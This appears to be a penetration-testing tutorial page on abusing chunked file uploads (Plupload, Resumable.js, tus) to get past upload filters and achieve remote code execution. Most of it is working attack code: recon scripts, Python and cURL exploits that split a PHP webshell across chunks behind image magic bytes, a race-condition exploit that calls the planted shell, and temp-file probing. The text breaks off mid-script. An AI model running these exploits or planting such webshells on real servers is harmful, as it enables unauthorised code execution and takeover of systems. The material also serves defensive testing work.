---
title: Chunked Upload Manipulation
description: Chunked Upload Manipulation — Exploit Fragmented File Upload Mechanisms for Filter Bypass & RCE
navigation:
  icon: i-lucide-split
  title: Chunked Upload Manipulation
---

## Chunked Upload Manipulation

::badge
**Critical Severity — CWE-434 / CWE-444 / CWE-436 / CWE-20**
::

::note
**Chunked Upload Manipulation** exploits the fragmented nature of modern file upload mechanisms. Applications increasingly use **chunked uploads** — splitting files into smaller pieces sent across multiple HTTP requests — to handle large files, provide progress indicators, and enable resumable transfers. This architecture introduces a **validation gap**: security checks often apply only to individual chunks or only at specific stages (first chunk, reassembly, or final processing), creating windows where malicious content slips through. By manipulating chunk boundaries, reordering fragments, racing between validation and assembly, or exploiting gaps between chunk-level and file-level validation, attackers can bypass even sophisticated upload filters to achieve Remote Code Execution.
::

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="How Chunked Uploads Work"}
  Modern file upload flows typically follow one of these patterns:

  **Pattern 1 — Client-Side Chunking (JavaScript)**
  1. Client JavaScript (Plupload, Resumable.js, Dropzone, tus) splits file into chunks (1-5 MB each)
  2. Each chunk is sent as a separate HTTP POST with metadata (chunk index, total chunks, upload ID)
  3. Server stores chunks temporarily in a staging directory
  4. After all chunks arrive, server reassembles them into the final file
  5. Validation may occur at chunk level, reassembly, or both — **gaps between stages are exploitable**

  **Pattern 2 — HTTP Chunked Transfer Encoding**
  1. Client sends a single HTTP request with `Transfer-Encoding: chunked`
  2. Body is sent in variable-size chunks, each prefixed with its hex size
  3. Server receives and buffers the complete body
  4. File is assembled from the buffered content
  5. **WAFs and proxies may parse chunks differently than the application server**

  **Pattern 3 — Resumable Upload Protocols (tus, GCS, S3)**
  1. Client initiates upload session, receives upload URI
  2. Client sends file in chunks via PATCH/PUT requests with byte range headers
  3. Server tracks upload progress and concatenates chunks
  4. Final file is assembled when all bytes are received
  5. **Validation typically happens only after final assembly — chunks bypass pre-upload checks**
  :::

  :::accordion-item{icon="i-lucide-layers" label="Where Validation Gaps Occur"}
  | Stage | What Happens | Common Gap |
  | ----- | ------------ | ---------- |
  | **Chunk upload** | Individual chunk is received | Magic bytes checked only on chunk 1, rest unchecked |
  | **Chunk storage** | Chunk saved to temp directory | Temp files may have executable extensions |
  | **Chunk validation** | Server inspects chunk content | Only header/footer checked, not full content |
  | **Reassembly** | Chunks merged into final file | Reassembled content not re-validated |
  | **Post-assembly check** | File type/extension validated | Race window between assembly and validation |
  | **Final storage** | File moved to permanent location | Filename may change, extension not rechecked |
  | **WAF inspection** | WAF analyzes request | Chunked encoding confuses WAF parsing |
  | **AV scanning** | Antivirus scans uploaded file | Scan happens async — file accessible before scan |
  :::

  :::accordion-item{icon="i-lucide-target" label="Attack Categories"}
  | Attack | Technique | Impact |
  | ------ | --------- | ------ |
  | **Split payload across chunks** | Magic bytes in chunk 1, PHP code in chunk 2 | Bypass content validation |
  | **Race condition** | Access file between assembly and validation | RCE before validation |
  | **Chunk reordering** | Send chunks out of order to confuse assembly | Bypass sequential validation |
  | **HTTP chunk smuggling** | Desync between WAF and server chunk parsing | WAF bypass |
  | **Chunk size manipulation** | Zero-size chunks, oversized chunks, negative sizes | Parser crash/bypass |
  | **Upload ID manipulation** | Modify upload session ID to overwrite other files | Arbitrary file write |
  | **Resume exploit** | Resume upload with different content than started | Content swap |
  | **Parallel chunk race** | Upload conflicting chunks simultaneously | Undefined behavior exploitation |
  | **Temp file access** | Access chunk files before assembly | Direct code execution |
  | **Reassembly path traversal** | Chunk metadata with path traversal in filename | Write outside upload dir |
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Impact"}
  | Impact | Scenario | Severity |
  | ------ | -------- | -------- |
  | **Remote Code Execution** | Webshell bypasses validation via chunk split | Critical |
  | **WAF Bypass** | Chunked encoding smuggles payload past WAF | Critical |
  | **Filter Bypass** | Magic bytes in chunk 1 pass validation; code in chunk 2 | Critical |
  | **Arbitrary File Write** | Upload ID/path manipulation writes to any directory | Critical |
  | **Race Condition RCE** | File accessed between assembly and deletion | Critical |
  | **Denial of Service** | Incomplete uploads exhaust disk/temp storage | High |
  | **AV Bypass** | File available before async AV scan completes | High |
  | **Data Corruption** | Parallel uploads to same session corrupt files | Medium |
  :::
::

---

## Reconnaissance & Target Analysis

### Chunked Upload Detection

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Identify Chunked Upload Endpoints"}
  ```bash
  # ═══════════════════════════════════════════════
  # Detect if the target uses chunked upload mechanisms
  # ═══════════════════════════════════════════════

  TARGET="https://target.com"

  # ── Crawl for chunked upload indicators ──
  katana -u "$TARGET" -d 5 -jc -kf -o crawl.txt
  grep -iE "chunk|resumable|plupload|dropzone|uppy|filepond|fine-uploader|tus|upload.*part|multipart.*chunk" crawl.txt | sort -u

  # ── Search JavaScript for chunking libraries ──
  curl -s "$TARGET" | grep -ioE "(plupload|resumable|dropzone|filepond|uppy|fine-upload|tus|flow\.js|chunk_size|chunkSize|uploadChunk|slice|blob\.slice)" | sort -u

  # Fetch and analyze JavaScript files
  katana -u "$TARGET" -d 3 -jc -ef png,jpg,gif,css,woff -o js_urls.txt
  grep "\.js" js_urls.txt | while read js_url; do
      CONTENT=$(curl -s "$js_url" 2>/dev/null)
      if echo "$CONTENT" | grep -qiE "chunk|resumable|plupload|dropzone|tus"; then
          echo "[+] Chunked upload code in: $js_url"
          echo "$CONTENT" | grep -ioE "(chunk_size|chunkSize|maxChunkSize|uploadChunk|chunks?[Uu]rl|tusEndpoint|resumableTarget)[^;]{0,100}" | head -10
      fi
  done

  # ── Check for common chunked upload endpoints ──
  ffuf -u "${TARGET}/FUZZ" -w <(cat << 'EOF'
  api/upload/chunk
  api/v1/upload/chunk
  api/v2/upload/chunk
  api/upload/init
  api/upload/start
  api/upload/complete
  api/upload/finalize
  api/upload/merge
  api/upload/assemble
  api/files/upload/chunk
  api/chunked-upload
  upload/chunk
  upload/init
  upload/resume
  upload/status
  upload/complete
  files/chunk
  tus/upload
  tus/files
  resumable/upload
  plupload
  Plupload/Upload
  handler.php
  upload_handler.php
  chunk_handler.php
  UploadHandler.ashx
  FileUpload.ashx
  EOF
  ) -mc 200,201,204,301,302,401,403,405,409

  # ── Detect tus protocol ──
  curl -sI -X OPTIONS "${TARGET}/api/upload" | grep -iE "tus-resumable|tus-version|tus-extension|upload-offset"
  curl -sI -X OPTIONS "${TARGET}/tus/files" | grep -iE "tus-resumable|tus-version"

  # ── Detect by response headers ──
  # Upload a small file and check response for chunk-related fields
  echo "test" > /tmp/detect_test.txt
  RESP=$(curl -s -D /tmp/chunk_headers.txt -X POST "${TARGET}/api/upload" \
    -F "file=@/tmp/detect_test.txt" -H "Cookie: session=TOKEN")
  grep -iE "upload-id|upload-offset|x-upload|chunk|session-id|upload-token" /tmp/chunk_headers.txt

  echo "$RESP" | grep -ioE "(uploadId|upload_id|sessionId|chunkIndex|totalChunks|uploadToken|resumableIdentifier)[^,}]*"

  rm -f /tmp/detect_test.txt /tmp/chunk_headers.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Protocol & Parameter Analysis"}
  ```bash
  # ═══════════════════════════════════════════════
  # Analyze the exact chunked upload protocol in use
  # ═══════════════════════════════════════════════

  TARGET="https://target.com"
  COOKIE="session=TOKEN"

  # ── Method 1: Capture chunked upload via Burp Suite ──
  # 1. Enable Burp Proxy
  # 2. Upload a file through the web UI
  # 3. In Proxy History, look for multiple sequential requests to the same endpoint
  # 4. Common patterns:
  #
  #    Plupload:
  #      POST /upload?name=file.jpg&chunk=0&chunks=3
  #      POST /upload?name=file.jpg&chunk=1&chunks=3
  #      POST /upload?name=file.jpg&chunk=2&chunks=3
  #
  #    Resumable.js:
  #      POST /upload?resumableChunkNumber=1&resumableChunkSize=1048576
  #           &resumableTotalSize=3145728&resumableIdentifier=file123
  #           &resumableFilename=test.jpg&resumableTotalChunks=3
  #
  #    tus Protocol:
  #      POST /files    → Returns Location: /files/abc123
  #      PATCH /files/abc123  (Upload-Offset: 0)     → chunk 1
  #      PATCH /files/abc123  (Upload-Offset: 1048576) → chunk 2
  #
  #    Custom:
  #      POST /api/upload/init    → {uploadId: "xyz"}
  #      POST /api/upload/chunk?id=xyz&index=0
  #      POST /api/upload/chunk?id=xyz&index=1
  #      POST /api/upload/complete?id=xyz

  # ── Method 2: Replay observed chunked upload ──
  # Record the parameters from Burp and test manipulation

  # ── Method 3: Brute-force parameter names ──
  echo "test chunk data" > /tmp/chunk_data

  # Common parameter names for chunk index
  for param in chunk chunkIndex chunk_index chunkNumber resumableChunkNumber \
               partNumber part_number index flowChunkNumber dzchunkindex; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        "${TARGET}/api/upload?${param}=0&chunks=2&filename=test.jpg" \
        -F "file=@/tmp/chunk_data" -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" != "404" ] && echo "[${STATUS}] Parameter: ${param}"
  done

  # Common parameter names for total chunks
  for param in chunks totalChunks total_chunks resumableTotalChunks \
               totalParts total_parts flowTotalChunks dzchunkcount; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        "${TARGET}/api/upload?chunk=0&${param}=2&filename=test.jpg" \
        -F "file=@/tmp/chunk_data" -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" != "404" ] && echo "[${STATUS}] Parameter: ${param}"
  done

  # Common parameter names for upload session ID
  for param in uploadId upload_id sessionId session_id id uuid token \
               resumableIdentifier flowIdentifier uploadToken; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        "${TARGET}/api/upload?chunk=0&chunks=2&${param}=test123" \
        -F "file=@/tmp/chunk_data" -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" != "404" ] && echo "[${STATUS}] Upload ID param: ${param}"
  done

  rm -f /tmp/chunk_data
  ```
  :::

  :::tabs-item{icon="i-lucide-microscope" label="Chunk Size & Limit Detection"}
  ```bash
  # ═══════════════════════════════════════════════
  # Detect chunk size limits, maximum chunks, and timing
  # ═══════════════════════════════════════════════

  TARGET="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  echo "═══ Chunk Size & Limit Detection ═══"

  # ── Test maximum chunk size ──
  for size_kb in 1 10 100 512 1024 2048 5120 10240; do
      dd if=/dev/zero bs=1024 count=$size_kb 2>/dev/null > /tmp/size_chunk
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 30 \
        -X POST "${TARGET}?chunk=0&chunks=1&filename=test.jpg" \
        -F "file=@/tmp/size_chunk" -H "Cookie: $COOKIE" 2>/dev/null)
      echo "[${STATUS}] Chunk size: ${size_kb} KB"
      [ "$STATUS" = "413" ] && echo "    → Max chunk size reached" && break
      [ "$STATUS" = "000" ] && echo "    → Connection timeout" && break
  done

  # ── Test minimum chunk size ──
  for size in 1 10 50 100 500; do
      dd if=/dev/zero bs=1 count=$size 2>/dev/null > /tmp/min_chunk
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${TARGET}?chunk=0&chunks=2&filename=test.jpg" \
        -F "file=@/tmp/min_chunk" -H "Cookie: $COOKIE" 2>/dev/null)
      echo "[${STATUS}] Min chunk: ${size} bytes"
  done

  # ── Test chunk count limits ──
  echo "test" > /tmp/count_chunk
  for count in 1 5 10 50 100 500 1000 5000; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${TARGET}?chunk=0&chunks=${count}&filename=test.jpg" \
        -F "file=@/tmp/count_chunk" -H "Cookie: $COOKIE" 2>/dev/null)
      echo "[${STATUS}] Declared chunks: ${count}"
      [ "$STATUS" = "400" ] && echo "    → Max chunk count reached" && break
  done

  # ── Test upload timeout / expiration ──
  echo "chunk0" > /tmp/timeout_chunk
  # Upload chunk 0
  curl -s -X POST "${TARGET}?chunk=0&chunks=3&filename=test.jpg" \
    -F "file=@/tmp/timeout_chunk" -H "Cookie: $COOKIE"

  # Wait increasing intervals then try chunk 1
  for wait in 5 30 60 120 300 600; do
      echo "[*] Waiting ${wait}s before sending chunk 1..."
      sleep $wait
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${TARGET}?chunk=1&chunks=3&filename=test.jpg" \
        -F "file=@/tmp/timeout_chunk" -H "Cookie: $COOKIE" 2>/dev/null)
      echo "[${STATUS}] After ${wait}s delay"
      [ "$STATUS" = "404" ] || [ "$STATUS" = "410" ] && echo "    → Session expired" && break
  done

  rm -f /tmp/size_chunk /tmp/min_chunk /tmp/count_chunk /tmp/timeout_chunk
  ```
  :::
::

---

## Exploitation Techniques

### Technique 1 — Split Payload Across Chunks

::tabs
  :::tabs-item{icon="i-lucide-scissors" label="Magic Bytes in Chunk 1, Code in Chunk 2"}
  ```python [split_payload_exploit.py]
  #!/usr/bin/env python3
  """
  Split payload across chunks to bypass validation.
  
  Strategy: Chunk 1 contains valid image header (passes magic byte check).
  Chunk 2+ contains PHP/ASPX code. When reassembled, the result is
  a file with valid magic bytes at the start and executable code after.
  
  This works when:
  - Validation checks only the FIRST chunk
  - Magic bytes/content type checked at upload time but not post-assembly
  - WAF inspects individual requests, not reassembled content
  """
  import requests
  import struct
  import time
  import sys
  import urllib3
  urllib3.disable_warnings()

  class ChunkedPayloadSplitter:
      # Valid file headers
      JPEG_HEADER = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
      PNG_HEADER = b'\x89PNG\r\n\x1a\n'
      GIF_HEADER = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00'
      BMP_HEADER = b'BM\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00'
      PDF_HEADER = b'%PDF-1.4\n'

      PHP_SHELLS = {
          'system': b'<?php system($_GET["cmd"]); ?>',
          'exec': b'<?php echo shell_exec($_REQUEST["cmd"]); ?>',
          'eval': b'<?php eval($_POST["e"]); ?>',
          'minimal': b'<?=`$_GET[c]`?>',
          'passthru': b'<?php passthru($_GET["cmd"]); ?>',
      }

      def __init__(self, upload_url, cookie=None):
          self.upload_url = upload_url
          self.session = requests.Session()
          self.session.verify = False
          if cookie:
              self.session.cookies.update(cookie)

      def split_and_upload_plupload(self, filename, header, shell_code, chunk_size=None):
          """Upload using Plupload-style chunked protocol"""
          full_payload = header + shell_code

          if chunk_size is None:
              # Split right after the magic bytes
              chunk_size = len(header) + 10  # Include a few bytes past header

          chunks = []
          for i in range(0, len(full_payload), chunk_size):
              chunks.append(full_payload[i:i + chunk_size])

          print(f"[*] Uploading {filename} in {len(chunks)} chunks")
          print(f"    Chunk 1: {len(chunks[0])} bytes (contains magic bytes)")
          if len(chunks) > 1:
              print(f"    Chunk 2: {len(chunks[1])} bytes (contains shell code)")

          for i, chunk_data in enumerate(chunks):
              params = {
                  'name': filename,
                  'chunk': str(i),
                  'chunks': str(len(chunks)),
              }

              files = {'file': (filename, chunk_data, 'application/octet-stream')}

              try:
                  r = self.session.post(self.upload_url, params=params, files=files, timeout=30)
                  print(f"    Chunk {i}: [{r.status_code}] {r.text[:100]}")

                  if r.status_code not in [200, 201, 204]:
                      print(f"    [-] Chunk {i} failed")
                      return False
              except Exception as e:
                  print(f"    [-] Error: {e}")
                  return False

              time.sleep(0.5)

          return True

      def split_and_upload_resumable(self, filename, header, shell_code, chunk_size=None):
          """Upload using Resumable.js-style protocol"""
          full_payload = header + shell_code

          if chunk_size is None:
              chunk_size = len(header) + 10

          chunks = []
          for i in range(0, len(full_payload), chunk_size):
              chunks.append(full_payload[i:i + chunk_size])

          identifier = f"upload_{int(time.time())}_{filename}"

          for i, chunk_data in enumerate(chunks):
              params = {
                  'resumableChunkNumber': str(i + 1),
                  'resumableChunkSize': str(chunk_size),
                  'resumableTotalSize': str(len(full_payload)),
                  'resumableIdentifier': identifier,
                  'resumableFilename': filename,
                  'resumableTotalChunks': str(len(chunks)),
                  'resumableRelativePath': filename,
              }

              files = {'file': (filename, chunk_data, 'application/octet-stream')}

              try:
                  r = self.session.post(self.upload_url, params=params, files=files, timeout=30)
                  print(f"    Chunk {i+1}/{len(chunks)}: [{r.status_code}]")
              except Exception as e:
                  print(f"    [-] Error: {e}")
                  return False

              time.sleep(0.3)

          return True

      def split_and_upload_tus(self, filename, header, shell_code):
          """Upload using tus resumable upload protocol"""
          full_payload = header + shell_code

          # Step 1: Create upload
          create_headers = {
              'Tus-Resumable': '1.0.0',
              'Upload-Length': str(len(full_payload)),
              'Upload-Metadata': f'filename {filename},filetype image/jpeg',
              'Content-Type': 'application/offset+octet-stream',
          }

          r = self.session.post(self.upload_url, headers=create_headers, timeout=30)
          if r.status_code not in [201, 200]:
              print(f"[-] tus create failed: {r.status_code}")
              return False

          upload_url = r.headers.get('Location', self.upload_url)
          print(f"[+] tus upload URL: {upload_url}")

          # Step 2: Upload in chunks
          chunk_size = len(header) + 10
          offset = 0

          while offset < len(full_payload):
              chunk = full_payload[offset:offset + chunk_size]
              patch_headers = {
                  'Tus-Resumable': '1.0.0',
                  'Upload-Offset': str(offset),
                  'Content-Type': 'application/offset+octet-stream',
              }

              r = self.session.patch(upload_url, headers=patch_headers, data=chunk, timeout=30)
              print(f"    Offset {offset}: [{r.status_code}] ({len(chunk)} bytes)")

              if r.status_code not in [200, 204]:
                  return False

              offset += len(chunk)
              time.sleep(0.3)

          return True

      def exploit_all_protocols(self, shell_type='system'):
          """Try all chunked upload protocols"""
          shell = self.PHP_SHELLS.get(shell_type, self.PHP_SHELLS['system'])

          combos = [
              ('JPEG', self.JPEG_HEADER, 'shell.php.jpg'),
              ('PNG', self.PNG_HEADER, 'shell.php.png'),
              ('GIF', self.GIF_HEADER, 'shell.php.gif'),
              ('JPEG', self.JPEG_HEADER, 'shell.phtml'),
              ('GIF', self.GIF_HEADER, 'shell.php5'),
          ]

          for header_name, header_bytes, filename in combos:
              print(f"\n{'='*50}")
              print(f"[*] Trying: {header_name} header + {filename}")

              print(f"\n--- Plupload protocol ---")
              self.split_and_upload_plupload(filename, header_bytes, shell)

              print(f"\n--- Resumable.js protocol ---")
              self.split_and_upload_resumable(filename, header_bytes, shell)

              print(f"\n--- tus protocol ---")
              self.split_and_upload_tus(filename, header_bytes, shell)


  if __name__ == "__main__":
      exploit = ChunkedPayloadSplitter(
          upload_url="https://target.com/api/upload",
          cookie={"session": "AUTH_TOKEN"},
      )
      exploit.exploit_all_protocols()
  ```
  :::

  :::tabs-item{icon="i-lucide-scissors" label="cURL Split Upload"}
  ```bash
  # ═══════════════════════════════════════════════
  # Split PHP shell across chunks using cURL
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FILENAME="shell.php.jpg"

  # ── Step 1: Create full payload ──
  SHELL='<?php system($_GET["cmd"]); ?>'
  JPEG_HEADER=$(printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00')

  # Combine into full payload
  printf '%s%s' "$JPEG_HEADER" "$SHELL" > /tmp/full_payload.bin

  # ── Step 2: Split into chunks ──
  # Chunk 1: JPEG header only (passes magic byte validation)
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > /tmp/chunk_0.bin

  # Chunk 2: PHP shell code (fails if checked alone, but chunk 1 already passed)
  echo -n '<?php system($_GET["cmd"]); ?>' > /tmp/chunk_1.bin

  # ── Step 3: Upload chunk 0 (contains valid image header) ──
  echo "[*] Uploading chunk 0 (image header)..."
  curl -s -X POST "${UPLOAD_URL}?chunk=0&chunks=2&name=${FILENAME}" \
    -F "file=@/tmp/chunk_0.bin;filename=${FILENAME};type=image/jpeg" \
    -H "Cookie: $COOKIE" -o /tmp/chunk0_resp.txt
  echo "    Response: $(cat /tmp/chunk0_resp.txt | head -1)"

  # ── Step 4: Upload chunk 1 (contains PHP code) ──
  echo "[*] Uploading chunk 1 (PHP payload)..."
  curl -s -X POST "${UPLOAD_URL}?chunk=1&chunks=2&name=${FILENAME}" \
    -F "file=@/tmp/chunk_1.bin;filename=${FILENAME};type=image/jpeg" \
    -H "Cookie: $COOKIE" -o /tmp/chunk1_resp.txt
  echo "    Response: $(cat /tmp/chunk1_resp.txt | head -1)"

  # ── Step 5: Trigger merge/finalize (if needed) ──
  echo "[*] Triggering merge..."
  curl -s -X POST "${UPLOAD_URL}?action=merge&name=${FILENAME}&chunks=2" \
    -H "Cookie: $COOKIE" -o /tmp/merge_resp.txt
  echo "    Response: $(cat /tmp/merge_resp.txt | head -1)"

  # Alternative merge endpoints
  for merge_ep in "complete" "finalize" "assemble" "done" "finish"; do
      curl -s -X POST "${UPLOAD_URL%/upload*}/upload/${merge_ep}" \
        -H "Content-Type: application/json" \
        -H "Cookie: $COOKIE" \
        -d "{\"filename\":\"${FILENAME}\",\"chunks\":2}" -o /dev/null -w "[%{http_code}] ${merge_ep}\n"
  done

  # ── Step 6: Verify shell execution ──
  echo ""
  echo "[*] Checking for shell..."
  for dir in uploads files media images tmp content static; do
      RESULT=$(curl -s "https://target.com/${dir}/${FILENAME}?cmd=echo+CHUNKED_BYPASS" 2>/dev/null)
      if echo "$RESULT" | grep -q "CHUNKED_BYPASS"; then
          echo "[+] RCE CONFIRMED: https://target.com/${dir}/${FILENAME}"
          break
      fi
  done

  rm -f /tmp/chunk_*.bin /tmp/full_payload.bin /tmp/*_resp.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-scissors" label="Advanced Split Strategies"}
  ```bash
  # ═══════════════════════════════════════════════
  # Advanced payload splitting strategies
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  SHELL='<?php system($_GET["cmd"]); ?>'

  # ── Strategy 1: Split PHP tag across chunk boundary ──
  # Chunk 1 ends with: <?ph
  # Chunk 2 starts with: p system($_GET["cmd"]); ?>
  # Validation on individual chunks won't detect PHP

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00<?ph' > /tmp/strat1_c0.bin
  printf 'p system($_GET["cmd"]); ?>' > /tmp/strat1_c1.bin

  echo "[*] Strategy 1: Split PHP tag"
  curl -s -X POST "${UPLOAD_URL}?chunk=0&chunks=2&name=test.php.jpg" \
    -F "file=@/tmp/strat1_c0.bin" -H "Cookie: $COOKIE" -w "[%{http_code}]\n"
  curl -s -X POST "${UPLOAD_URL}?chunk=1&chunks=2&name=test.php.jpg" \
    -F "file=@/tmp/strat1_c1.bin" -H "Cookie: $COOKIE" -w "[%{http_code}]\n"

  # ── Strategy 2: Null bytes between chunks ──
  # Chunk 1: Valid image data
  # Chunk 2: Null padding to push PHP past any size-limited scan
  # Chunk 3: PHP code far enough into the file to avoid scanning

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > /tmp/strat2_c0.bin
  dd if=/dev/zero bs=1024 count=100 2>/dev/null > /tmp/strat2_c1.bin  # 100KB of nulls
  echo -n "$SHELL" > /tmp/strat2_c2.bin

  echo "[*] Strategy 2: Null padding"
  curl -s -X POST "${UPLOAD_URL}?chunk=0&chunks=3&name=test.jpg" \
    -F "file=@/tmp/strat2_c0.bin" -H "Cookie: $COOKIE" -w "[%{http_code}]\n"
  curl -s -X POST "${UPLOAD_URL}?chunk=1&chunks=3&name=test.jpg" \
    -F "file=@/tmp/strat2_c1.bin" -H "Cookie: $COOKIE" -w "[%{http_code}]\n"
  curl -s -X POST "${UPLOAD_URL}?chunk=2&chunks=3&name=test.jpg" \
    -F "file=@/tmp/strat2_c2.bin" -H "Cookie: $COOKIE" -w "[%{http_code}]\n"

  # ── Strategy 3: Valid image chunk + shell as separate "file" ──
  # Some implementations allow changing the filename between chunks

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00' > /tmp/strat3_c0.bin
  echo -n "$SHELL" > /tmp/strat3_c1.bin

  echo "[*] Strategy 3: Filename change between chunks"
  curl -s -X POST "${UPLOAD_URL}?chunk=0&chunks=2&name=avatar.jpg" \
    -F "file=@/tmp/strat3_c0.bin;filename=avatar.jpg" -H "Cookie: $COOKIE" -w "[%{http_code}]\n"
  # Change filename in chunk 2
  curl -s -X POST "${UPLOAD_URL}?chunk=1&chunks=2&name=avatar.php" \
    -F "file=@/tmp/strat3_c1.bin;filename=avatar.php" -H "Cookie: $COOKIE" -w "[%{http_code}]\n"

  # ── Strategy 4: GIF comment embedding across chunks ──
  printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xfe' > /tmp/strat4_c0.bin
  printf "\x1e${SHELL}\x00\x3b" > /tmp/strat4_c1.bin

  echo "[*] Strategy 4: GIF comment split"
  curl -s -X POST "${UPLOAD_URL}?chunk=0&chunks=2&name=shell.phtml" \
    -F "file=@/tmp/strat4_c0.bin" -H "Cookie: $COOKIE" -w "[%{http_code}]\n"
  curl -s -X POST "${UPLOAD_URL}?chunk=1&chunks=2&name=shell.phtml" \
    -F "file=@/tmp/strat4_c1.bin" -H "Cookie: $COOKIE" -w "[%{http_code}]\n"

  rm -f /tmp/strat*_c*.bin
  ```
  :::
::

### Technique 2 — Race Condition Exploitation

::tabs
  :::tabs-item{icon="i-lucide-timer" label="Race Between Assembly & Validation"}
  ```python [chunk_race_exploit.py]
  #!/usr/bin/env python3
  """
  Race condition exploit for chunked uploads.
  
  Attack: Upload all chunks rapidly, then immediately access the
  assembled file BEFORE the server validates/deletes it.
  
  The window between assembly and validation/deletion is typically
  10ms-500ms — enough time if we send rapid requests.
  """
  import requests
  import threading
  import time
  import sys
  import urllib3
  urllib3.disable_warnings()

  class ChunkedRaceExploit:
      def __init__(self, upload_url, verify_url_pattern, cookie=None):
          self.upload_url = upload_url
          self.verify_url_pattern = verify_url_pattern
          self.session = requests.Session()
          self.session.verify = False
          if cookie:
              self.session.cookies.update(cookie)
          self.rce_confirmed = False
          self.rce_url = None

      def upload_chunks_fast(self, filename, chunks_data, protocol='plupload'):
          """Upload all chunks as fast as possible"""
          for i, chunk in enumerate(chunks_data):
              if protocol == 'plupload':
                  params = {'chunk': str(i), 'chunks': str(len(chunks_data)), 'name': filename}
              elif protocol == 'resumable':
                  params = {
                      'resumableChunkNumber': str(i + 1),
                      'resumableChunkSize': '1048576',
                      'resumableTotalSize': str(sum(len(c) for c in chunks_data)),
                      'resumableIdentifier': f'race_{int(time.time())}',
                      'resumableFilename': filename,
                      'resumableTotalChunks': str(len(chunks_data)),
                  }
              else:
                  params = {'chunk': str(i), 'chunks': str(len(chunks_data)), 'name': filename}

              files = {'file': (filename, chunk, 'image/jpeg')}
              try:
                  self.session.post(self.upload_url, params=params, files=files, timeout=5)
              except:
                  pass

      def race_access(self, filename, duration=5):
          """Rapidly attempt to access the file during the race window"""
          url = self.verify_url_pattern.format(filename=filename)
          end_time = time.time() + duration

          while time.time() < end_time and not self.rce_confirmed:
              try:
                  r = self.session.get(url, params={'cmd': 'echo RACE_CONDITION_RCE'},
                                       timeout=2)
                  if 'RACE_CONDITION_RCE' in r.text:
                      self.rce_confirmed = True
                      self.rce_url = url
                      print(f"\n[!!!] RACE WON — RCE at: {url}")
                      return True
              except:
                  pass

          return False

      def exploit(self, iterations=50, protocol='plupload'):
          """Run the race condition exploit"""
          shell = b'\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>'

          # Split into 2 chunks
          mid = len(shell) // 2
          chunks = [shell[:mid], shell[mid:]]

          # Try different filenames
          filenames = ['shell.php', 'shell.phtml', 'shell.php5', 'shell.php.jpg']

          print(f"[*] Starting race condition exploit")
          print(f"[*] Iterations per filename: {iterations}")
          print(f"[*] Protocol: {protocol}")

          for filename in filenames:
              print(f"\n[*] Testing: {filename}")

              for i in range(iterations):
                  if self.rce_confirmed:
                      break

                  # Start racer threads
                  access_thread = threading.Thread(
                      target=self.race_access,
                      args=(filename, 3)
                  )
                  access_thread.start()

                  # Upload chunks
                  self.upload_chunks_fast(filename, chunks, protocol)

                  access_thread.join(timeout=5)

                  if self.rce_confirmed:
                      break

                  if (i + 1) % 10 == 0:
                      print(f"    Iteration {i+1}/{iterations}...")

              if self.rce_confirmed:
                  break

          if self.rce_confirmed:
              print(f"\n[+] Race condition exploit successful!")
              print(f"[+] Shell: {self.rce_url}?cmd=COMMAND")
          else:
              print(f"\n[-] Race condition not exploitable within {iterations} iterations")

          return self.rce_confirmed


  if __name__ == "__main__":
      exploit = ChunkedRaceExploit(
          upload_url="https://target.com/api/upload",
          verify_url_pattern="https://target.com/uploads/{filename}",
          cookie={"session": "AUTH_TOKEN"},
      )
      exploit.exploit(iterations=100, protocol='plupload')
  ```
  :::

  :::tabs-item{icon="i-lucide-timer" label="Temp File Access Race"}
  ```bash
  # ═══════════════════════════════════════════════
  # Access temporary chunk files before assembly
  # Some servers store chunks as accessible temp files
  # ═══════════════════════════════════════════════

  TARGET="https://target.com"
  UPLOAD_URL="${TARGET}/api/upload"
  COOKIE="session=TOKEN"

  SHELL='<?php system($_GET["cmd"]); ?>'

  # ── Step 1: Upload a chunk and immediately probe for temp files ──

  echo "$SHELL" > /tmp/temp_chunk
  UPLOAD_ID="test_$(date +%s)"

  # Upload chunk 0 but DON'T send all chunks (keep session alive)
  curl -s -X POST "${UPLOAD_URL}?chunk=0&chunks=99&name=shell.php&uploadId=${UPLOAD_ID}" \
    -F "file=@/tmp/temp_chunk;filename=shell.php" \
    -H "Cookie: $COOKIE" &
  UPLOAD_PID=$!

  sleep 0.5

  # ── Step 2: Probe common temp file locations ──
  echo "[*] Probing for accessible temp files..."

  TEMP_PATTERNS=(
      # Common temp paths
      "${TARGET}/uploads/tmp/${UPLOAD_ID}"
